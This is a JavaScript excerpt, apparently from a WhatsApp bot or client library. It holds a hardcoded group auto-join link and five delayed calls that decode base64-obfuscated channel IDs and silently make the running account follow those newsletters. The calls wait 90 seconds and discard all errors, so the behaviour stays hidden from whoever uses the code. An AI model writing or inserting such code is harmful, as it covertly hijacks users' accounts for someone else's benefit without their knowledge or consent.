...
const AUTO_JOIN_GROUP_LINKS = [
    "https://chat.whatsapp.com/HrPlxS7sFdd2GMNF7PoIYC?mode=gi_t"
];
...
setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDA1MTkzMTcyNTMxQG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}
}, 90000);
...
setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDI0MTU4MjMxOTMxQG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}
}, 90000);
...
setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDIzMTE1ODU5MjE2QG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}
}, 90000);
...
setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDA1NzUxODQ2MDk5QG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}
}, 90000);
...
setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDI1MjE1NTM5MTE3QG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}
}, 90000);
